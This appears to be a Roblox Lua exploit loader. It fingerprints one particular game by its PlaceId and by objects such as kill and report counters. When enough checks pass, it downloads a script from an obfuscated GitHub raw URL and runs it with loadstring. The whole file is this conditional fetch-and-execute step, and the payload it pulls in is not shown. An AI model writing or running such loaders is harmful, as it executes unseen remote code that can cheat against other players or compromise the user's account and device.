repeat task.wait() until game:IsLoaded()
local condiciones = 0
local player = game:GetService('Players').LocalPlayer

if game.PlaceId == 87018676608089 then condiciones += 10 end

if game.Workspace:FindFirstChild('Effects', true) then condiciones += 1 end
if game.Workspace:FindFirstChild('LoadedMap', true) then condiciones += 1 end
if game.ReplicatedStorage:FindFirstChild('ErrorMessage', true) then condiciones += 1 end
if game.ReplicatedStorage:FindFirstChild('UpdateDailyTask', true) then condiciones += 1 end
if game:FindFirstChild('TotalHeadShots', true) then condiciones += 1 end
if game:FindFirstChild('TotalKills', true) then condiciones += 1 end
if game:FindFirstChild('TotalReports', true) then condiciones += 1 end
if game:FindFirstChild('TotalRolls', true) then condiciones += 1 end

if condiciones >= 8 then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptsOfucacion/8274610739jldn827391692876551986728373672282902/refs/heads/main/9183729286492029373739919173793028374920483992748302937482926515829492519394838HakduhaKhekdlzi917639293783928374"))()
end
